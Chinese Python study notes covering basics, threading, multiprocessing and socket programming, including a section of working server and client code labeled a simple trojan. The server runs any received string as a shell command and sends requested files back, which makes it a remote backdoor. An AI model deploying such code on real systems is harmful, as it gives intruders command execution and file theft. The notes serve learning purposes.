## 环境配置

```sh
$ sudo apt install python3
$ python3 -m pip install pip -U
$ python3 -m pip install virtualenv
```

`virtualenv`使用

```sh
$ virtualenv envname			# using directly in some directory
$ virtualenv -p /usr/bin/python2.7 venv	# assign a python version
$ . envname/bin/activate
$ deactivate
```

## 内建类型

标准整型 长整型

布尔类型和布尔对象

双精度浮点型

十进制浮点型 `Decimal(.1)`

复数

ASCII转换 `ord`和`chr`转换字符串与数字。

字符串， 列表， 元组， 字典， 集合

## 函数

`docstring`

```python
def printMax2(x, y):
    '''Prints the maximum of two numbers.
 
    The two values must be integers.'''
    x = int(x) # convert to integers, if possible
    y = int(y)
 
    if x > y:
        print(x, 'is maximum')
    else:
        print(y, 'is maximum')
 
printMax2(3, 5)
print(printMax2.__doc__)
```

## 异常

```python
try:
    f = open('integers.txt')
    s = f.readline()
    i = int(s.strip())
except (IOError, ValueError):
    print("An I/O error or a ValueError occurred")
except:
    print("An unexpected error occurred")
    raise
```

自定义异常

```python
class ShortInputException(Exception):
    '''A user-defined exception class.'''
    def __init__(self, length, atleast):
        Exception.__init__(self)
        self.length = length
        self.atleast = atleast
 
try:
    s = raw_input('Enter something --> ')
    if len(s) < 3:
        raise ShortInputException(len(s), 3)
    # Other work can continue as usual here
except EOFError:
    print('\nWhy did you do an EOF on me?')
except ShortInputException as x:
    print('ShortInputException: The input was of length %d, \
          was expecting at least %d' % (x.length, x.atleast))
else:
    print('No exception was raised.')
```

`finally`

```python
def test1():
   try:
      print('to do stuff')
      raise Exception('hehe')
   except Exception:
      print('process except')
      print('to return in except')
      return 'except'
   finally:
      print('to return in finally')
      return 'finally'
 
test1Return = test1()
print('test1Return : ' + test1Return)
```

运行结果

```
to do stuff
process except
to return in except
to return in finally
test1Return : finally
```

## 类

```python
class SchoolMember:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    def tell():
        print(self.name, self.age)
    
class Teacher(SchoolMember):
    def __init__(self, name, age, salary):
        SchoolMember.__init__(self, name, age)
        self.salary = salary
        
    def tell():
        print(self.name, self.age, self.salary)
```

## 文件操作

`open`, `read`, `write`

`os.remove`

`os.rename` `os.renames` `os.listdir` `os.chdir` `os.walk` `os.rmdir` `os.removedirs`

`stat`

## 多线程

`thread` `threading` 模块

```
Python代码的执行由Python虚拟机（解释器）来控制。Python在设计之初就考虑要在主循环中，同时只有一个线程在执行，就像单CPU的系统中运行多个进程那样，内存中可以存放多个程序，但任意时刻，只有一个程序在CPU中运行。同样地，虽然Python解释器可以运行多个线程，只有一个线程在解释器中运行。对Python虚拟机的访问由全局解释器锁（GIL）来控制，正是这个锁能保证同时只有一个线程在运行。在多线程环境中，Python虚拟机按照以下方式执行。

1.设置GIL。
2.切换到一个线程去执行。
3.运行。
4.把线程设置为睡眠状态。
5.解锁GIL。
6.再次重复以上步骤。

对所有面向I/O的（会调用内建的操作系统C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其他线程在这个线程等待I/O的时候运行。如果某线程并未使用很多I/O操作，它会在自己的时间片内一直占用处理器和GIL。也就是说，I/O密集型的Python程序比计算密集型的Python程序更能充分利用多线程的好处。


作者：DarrenChan陈驰
链接：https://www.zhihu.com/question/23474039/answer/269526476
```



```python
# -*- coding: UTF-8 -*-
import threading

class SimpleCreator():
    def f(self):
        print('线程执行\n')
        return
    def __init__(self):
        return
        
    def creatThread(self):
        for i in range(3):
            t = threading.Thread(target=self.f)
            t.start()
    


if __name__ == '__main__':
    sc = SimpleCreator()
    sc.creatThread()
```

传参例子

```python
class SimpleCreator():
    def f(self,id):
        print('线程执行 %s \n' %id)
        return
    def __init__(self):
        return
        
    def creatThread(self):
        for i in range(3):
            t = threading.Thread(target=self.f,args=(i,))
            t.start()
```

继承

```python
# -*- coding: UTF-8 -*-
from threading import Thread


class MyThread(Thread):
    def __init__(self, id):
        super(MyThread, self).__init__()  # 重构run函数必须要写
        self.id = id

    def run(self): #重写run方法
        print("task", self.id)

#调用自定义类
if __name__ == "__main__":
    t1 = MyThread("t1")
    t2 = MyThread("t2")

    t1.start()
    t2.start()
```

### 线程唯一标识符 identify

```python
# -*- coding: UTF-8 -*-
from threading import Thread,currentThread


class MyThread(Thread):
    def __init__(self, n):
        if n != "":
            super(MyThread, self).__init__(name=n)  # 重构run函数必须要写
        else:
            super(MyThread, self).__init__()  # 重构run函数必须要写


    def run(self):
        print("name:%s\n"  %self.getName())#获取名称


if __name__ == "__main__":
    t1 = MyThread("")
    t2 = MyThread("t2")

    t1.start()
    t2.start()
    print(currentThread().getName())#获取当前线程的名字
```

### setDaemon

```python
# -*- coding: UTF-8 -*-

from threading import Thread
import time
class MyThread(Thread):
        def __init__(self):
                super(MyThread, self).__init__()
        def run(self):
                time.sleep(5)
                print("我是子线程：" + self.getName())
 
if __name__ == "__main__":
        t1=MyThread()
        t1.setDaemon(True)
        t1.start()
print("我是主线程！")
```

默认情况下，主线程会等待子线程全部结束后，才结束。通过使用`setDaemon`函数可实现，主线程完成不管子线程完成与否就结束。

### join

```python
# -*- coding: UTF-8 -*-

import threading
import time
class MyThread(threading.Thread):
        def __init__(self,id):
                super(MyThread, self).__init__()
                self.id = id
        def run(self):
                time.sleep(3)
                print(self.id)
 
if __name__ == "__main__":
        t1=MyThread(999)
        t1.start()
        for i in range(5):
            print(i)
```

打印结果

```
0
1
2
3
4
999
```

使用`join`函数后，主线程会阻塞在调用处等待子线程完成。（描述待确定

```python
if __name__ == "__main__":
        t1=MyThread(999)
        t1.start()
        t1.join()#此处增加join调用
        for i in range(5):
            print(i)
```

即产生输出

```
999
0
1
2
3
4
```

### Timer

Timer（定时器）是Thread的派生类，用于在指定时间后调用一个方法。

```python
# -*- coding: UTF-8 -*-

import threading
import time

def hello():
    print("hello, Timer")

if __name__ == '__main__':
    t = threading.Timer(3.0, hello)
    t.start()
```

start之后3秒开始执行线程。

### lock

由于线程之间是进行随机调度，当多个线程同时修改同一条数据时可能会出现脏数据，所以，出现了线程锁，即同一时刻只允许一个线程执行操作。

```python
# -*- coding: UTF-8 -*-

import threading
import time

num = 0
def run(n):
    lock.acquire()  #获取锁
    global num
    print('start:', num)
    num += 1
    print('end', num)
    lock.release()  #释放锁

lock = threading.Lock()  # 实例化一个锁对象
for i in range(200):
    t = threading.Thread(target=run, args=("t-%s" % i,))
    t.start()
    t.join()
```

`threading.RLock`可以使用递归锁。

RLock其实叫做“Reentrant Lock”，就是可以重复进入的锁，也叫做“递归锁”。这种锁对比Lock有是三个特点：1. 谁拿到谁释放。如果线程A拿到锁，线程B无法释放这个锁，只有A可以释放；2. 同一线程可以多次拿到该锁，即可以acquire多次；3. acquire多少次就必须release多少次，只有最后一次release才能改变RLock的状态为unlocked

## 多进程

### create

```python
# -*- coding: UTF-8 -*-

from multiprocessing import Process
import os

def info(title):
    print(title)
    print('module name:', __name__)
    print('parent process:', os.getppid())
    print('process id:', os.getpid())

def f(name):
    info('function f')
    print('hello', name)

if __name__ == '__main__':
    info('main line')
    p = Process(target=f, args=('bob',))#创建进程
    p.start()
    p.join()
```

如果想要手动终止进程可以调用p.terminate()。

### communication

#### Queue

通过Queue可以实现多个进程间的数据共享，Queue类提供了put方法存放数据，get方法获取数据，get方法获取数据的同上会清空队列。

```python
# -*- coding: UTF-8 -*-

from multiprocessing import Process, Queue
import time

def f(q, data):
    q.put(data)#添加数据
def out(q):
    time.sleep(4)
    print(q.get())#获取数据

if __name__ == '__main__':
    q = Queue()#创建Queue实例
    p = Process(target=f, args=(q, [1, 2, 3]))
    p.start()
   
    p.join()

    p1 = Process(target=out,args=(q,))
    p1.start()
    
    p1.join()
```

#### Pipe

`multiprocessing.Pipe()`即管道模式，调用Pipe()返回管道的两端的Connection。Pipe的本质是进程之间的数据传递，而不是数据共享，这和socket有点像。pipe()返回两个连接对象分别表示管道的两端，每端都有`send()`和`recv()`方法。如果两个进程试图在同一时间的同一端进行读取和写入那么，这可能会损坏管道中的数据。

```python
# -*- coding: UTF-8 -*-
import multiprocessing 

def consumer(pipe):
    output_p,input_p=pipe
    input_p.close() #关闭管道的输入端
    while True:
        try:
            item=output_p.recv()
            print(item)
        except EOFError:
            break


#生产项目并将其放置到队列上，sequence是代表要处理项目的可迭代对象
def producer(sequence,input_p):
    for item in sequence:
        #将项目放置在队列上
        input_p.send(item)
if __name__=="__main__":
    (output_p,input_p)=multiprocessing.Pipe(True)
    #启动使用者进程
    cons_p=multiprocessing.Process(target=consumer,args=((output_p,input_p),))
    cons_p.start()

    #关闭生产者中的输出管道
    output_p.close()
    print("生产者关闭")
    #生产项目
    sequence=[1,2,3,4]
    producer(sequence,input_p)
    #关闭输入管道，表示完成
    input_p.close()
    #等待使用者进程关闭
    cons_p.join()
```

pipe示例图

![](https://raw.githubusercontent.com/lc1838228782/pics/master/img/python pipe.png)

### 进程锁

和多线程编程一样，当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。

```python
# -*- coding: UTF-8 -*-
import multiprocessing 
import time

def job(v, num, l):
    l.acquire() # 锁住
    for _ in range(5):
        time.sleep(0.1) 
        v.value += num # 获取共享内存
        print(v.value)
    l.release() # 释放

def multicore():
    l = multiprocessing.Lock() # 定义一个进程锁
    v = multiprocessing.Value('i', 0) # 定义共享内存
    p1 = multiprocessing.Process(target=job, args=(v,1,l)) # 需要将lock传入
    p2 = multiprocessing.Process(target=job, args=(v,3,l)) 
    p1.start()
    p2.start()
    p1.join()
    p2.join()

if __name__ == '__main__':
    multicore()
```

### 进程池

由于进程启动的开销比较大，使用多进程的时候会导致大量内存空间被消耗。为了防止这种情况发生可以使用进程池。进程池会缓存一些进程在池子中，使用的时候直接拿来用，使用完毕回收到池子中。


进程池中常用方法：

```python
apply() 			# 同步执行（串行）
apply_async() 		# 异步执行（并行）
terminate() 		# 立刻关闭进程池
join() 				# 主进程等待所有子进程执行完毕。必须在close或terminate()之后。
close() 			# 等待所有进程结束后，才关闭进程池。
```

示例

```python
# -*- coding: UTF-8 -*-

from  multiprocessing import Process,Pool
import time
 
def Foo(i):
    time.sleep(2)
    return i+100
 
def Bar(arg):
    print('-->exec done:',arg)
 
pool = Pool(5)  # 允许进程池同时放入5个进程
 
for i in range(10):
    pool.apply_async(func=Foo, args=(i,),callback=Bar)  # func子进程执行完后，才会执行callback，否则callback不执行（而且callback是由父进程来执行了）
 
print('end')
pool.close()
pool.join() # 主进程等待所有子进程执行完毕。必须在close()或terminate()之后。
```

## Socket编程基础

### socket 类

Python 提供了两个基本的 socket 模块：

* `socket` 它提供了标准的BSD Socket API。
* `socketserver` 为服务器端编程提供了进一步封装，可以简化网络服务器的开发。

调用socket.socket可以创建一个Socket实例，socket类构造函数声明如下：

```
socket(family, type[,protocal])
```

我们看到socket构造函数接收三个参数

第一个为family。family表示套接字对象使用的地址族，可选值：AF_INET——IPv4地址族，AF_INET6——IPv6地址族，AF_UNIX——针对类UNIX系统的套接字。

第二个为type，可使用的类型如下：

| socket 类型           | 描述                                                         |
| :-------------------- | :----------------------------------------------------------- |
| socket.SOCK_STREAM    | 基于TCP的流式socket通信                                      |
| socket.SOCK_DGRAM     | 基于UDP的数据报式socket通信                                  |
| socket.SOCK_RAW       | 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次SOCK_RAW也可以处理特殊的IPV4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头 |
| socket.SOCK_SEQPACKET | 可靠的连续数据包服务                                         |

第三个参数protocal是协议类型，默认是0表示套接字，在套接字编程中不需要关心该参数。

创建TCP Socket的方法如下：

```Python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```

创建UDP Socket的方法如下：

```
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
```

接下来我们基于socket类来实现简单的客户端和服务端。

### 客户端编程

新建client.py文件，添加如下代码：

```Python
# -*- coding: UTF-8 -*-

import socket
import sys

# 测试类
class Client:
    def __init__(self,hostname):
        self.hostname = hostname # 待连接的远程主机的域名
    def connet(self): # 连接方法
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as e:
            print("Failed to create socket. Error: %s"%e)

        sys.exit() # 退出进程

if __name__ == '__main__':
    cl = Client('www.baidu.com')
    cl.connet()
```

我们定义一个测试类名为Client，构造函数接收一个域名，用于连接测试。定义了connet方法，创建一个tcp类型的socket实例，向服务端发起连接。该方法最后调用sys.exit()退出。下面我们完善connet方法：

```Python
 def connet(self): #连接方法
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as e:
            print("Failed to create socket. Error: %s"%e)
            sys.exit() #退出进程
        try:
            remote_ip = socket.gethostbyname(self.hostname)#根据域名获取ip
        except socket.gaierror:
            print('主机无法被解析')
            sys.exit() #退出进程
        try:
            s.connect((remote_ip,80))#连接
            message = b"GET / HTTP/1.1\r\n\r\n"
            s.sendall(message)#发送数据
            reply = s.recv(4096)#接收数据
            print(reply)
            s.close()#关闭连接
        except socket.error:
            sys.exit() #退出进程
```

现在简单总结下Socket客户端编程的基本步骤：

1. 创建套接字

2. 连接服务端

3. 发送数据

4. 接收数据

5. 关闭连接

### 服务端编程

新建server.py文件，添加如下代码：

```Python
# -*- coding: UTF-8 -*-

import socket
import sys

class server:
    def __init__(self,ip,port):
        self.port=port
        self.ip=ip
    def start(self):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#创建socket
        try:
            s.bind((self.ip,self.port))#绑定
            s.listen(10)#监听
            print('等待客户端连接')
            conn, addr = s.accept()#接收连接
            print('客户端连接 ' + addr[0] + ':' + str(addr[1]))
            data = conn.recv(1024)#接收数据
            print("客户端数据：%s"%data)
            conn.sendall(bytes("你好客户端\n\r", encoding = "utf8"))#发送数据
            conn.close()#关闭连接
           
        except socket.error as e:
            print(e)
            sys.exit()
        finally:
             s.close() #关闭服务端


if __name__ == '__main__':
    s = server('',8800)
    s.start()

```

## 一个简单木马

server

```python
# -*- coding: UTF-8 -*-
import socket
import sys
import os

class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.buffersize = 10240

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind((self.ip, self.port))
            s.listen(10)
            print("waiting for client")
            while True:
                try:
                    conn, addr = s.accept()
                    print('client connection ' + addr[0] + ":" + str(addr[1]))
                    while True:
                        data = conn.recv(self.buffersize)
                        if not data:
                            break;
                        else:
                            self.executeCommand(conn, data)
                    conn.close()
                except socket.error as e:
                    print(e)
                    conn.close()
        finally:
            s.close()

    def executeCommand(self, tcpCliSock, data):
        try:
            message = data.decode("utf-8")
            if os.path.isfile(message):
                filesize = str(os.path.getsize(message))
                print("filesize: " + filesize)
                tcpCliSock.send(filesize.encode())
                data = tcpCliSock.recv(self.buffersize)
                print("start transmit")
                f = open(message, "rb")
                for line in f:
                    tcpCliSock.send(line)
            else:
                tcpCliSock.send(("0001" + os.popen(message).read()).encode("utf-8"))
        except:
            raise

if __name__ == "__main__":
    s = Server("", 8800)
    s.start()
```

client

```python
# -*- coding: UTF-8 -*-
import socket
import sys
import re
import os

class Client:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.buffersize = 10240
    
    def connect(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except scoket.error as e:
            print("Failed to create socket. Error: %s" % e)

        try:
            s.connect((self.ip, self.port))
            while True:
                message = input("> ")
                if not message:
                    break
                s.send(message.encode("utf-8"))
                data = s.recv(self.buffersize)
                if not data:
                    break
                if re.search("^0001", data.decode("utf-8", "ignore")):
                    print(data.decode("utf-8")[4:])
                else:
                    s.send("File size received".encode("utf-8"))
                    file_total_size = int(data.decode())
                    received_size = 0
                    f = open("new" + os.path.split(message)[-1], "wb")

                    while received_size < file_total_size:
                        data = s.recv(self.buffersize)
                        f.write(data)
                        received_size += len(data)
                        print("Received:", received_size)
                    f.close()
                    print("Recived done", file_total_size, received_size)
        except socket.error:
            s.close()
            raise
        finally:
            s.close()

if __name__ == "__main__":
    c1 = Client("127.0.0.1", 8800)
    c1.connect()
    sys.exit()
```

## 多连接、非阻塞的服务端、客户端编程

**粘包**

```
什么是粘包？

1.发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小、数据量小的数据包，合并成一个大的数据包发送(把发送端的缓冲区填满一次性发送)。

2接收端底层会把tcp段整理排序交给缓冲区，这样接收端应用程序从缓冲区取数据就只能得到整体数据而不知道怎么拆分

比如发送端发送了一个由2个100字节组成的200字节的数据包到接受端的缓冲区，接受端从缓冲去一次取80字节的数据，那么第一次取的就是一个不完整的数据包，第二次取就会带上第一个数据包的尾部和下一个数据包的头部数据。
```





















## ref

https://github.com/xuanhun/PythonHackingBook1